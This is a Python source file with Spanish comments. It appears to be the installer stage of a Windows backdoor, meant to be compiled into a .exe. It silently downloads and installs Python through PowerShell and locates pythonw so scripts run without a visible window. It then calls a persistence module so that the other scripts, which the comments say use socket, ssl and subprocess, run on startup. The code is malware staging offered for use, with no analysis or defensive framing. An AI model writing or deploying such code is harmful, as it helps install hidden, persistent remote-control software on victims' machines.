
import platform
import subprocess
import os
import windows_persistence_unit
import sys
import ctypes

"""
Este script tiene que instalar todo lo necesario para poder correr 
el resto de scripts:
    
Este script va a ir compilado en un .exe para windows 
    
    -python3
    -pythonw (?) no se sabe si viene instalado con python, hay que comprobar
    -import socket
    -import subprocess
    -import os
    -import ssl
    -import platform
    -import time
    En teoría no es necesario importar esas librerias
    
Es importante guardar la ruta de instalacion de pythonw para 
pasarselas a la unidad de persistencia
    
"""



def install_python_windows(arquitecture):
    python_installer_url = ''
    if arquitecture.endswith('64'):
        python_installer_url = 'https://www.python.org/ftp/python/3.10.0/python-3.10.0-amd64.exe'
    else:
        python_installer_url = 'https://www.python.org/ftp/python/3.10.0/python-3.10.0.exe'
    
   
    os.system(f"powershell -Command \"(New-Object System.Net.WebClient).DownloadFile('{python_installer_url}', 'python_installer.exe')\"")
    print("Downloading resources...")
    
    subprocess.call(["python_installer.exe", "/quiet", "InstallAllUsers=1", "PrependPath=1"])
   
    print("Succcesfully Installed python3")
    os.remove("python_installer.exe")


def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False
        
    
    
if __name__ == "__main__":
    
 
    """
    if is_admin()==False:
        print("You should execute this program with elevation, sorry")
        sys.exit()
    """   
        
    arquitecture = platform.machine()
    is_not_installed = platform.python_version() < '3'
    pythonw_installation_path = ''
   

    if(is_not_installed):
        install_python_windows(arquitecture)
    pythonw_installation_path = subprocess.getoutput('where pythonw').split('\n')
    
    if (len(pythonw_installation_path)>1):
        for x in pythonw_installation_path:
            if 'Programs' in x:
                pythonw_installation_path = x
                #print(pythonw_installation_path)
    if (len(pythonw_installation_path)==1):
        pythonw_installation_path = pythonw_installation_path[0]
        """
        en la persistencia hay que comprobar primero que no este ya implementada
        par evitar errores de sobreescritura
        """
    
    windows_persistence_unit.create_persistence(pythonw_installation_path)
    input("creada la persistencia")
        
   

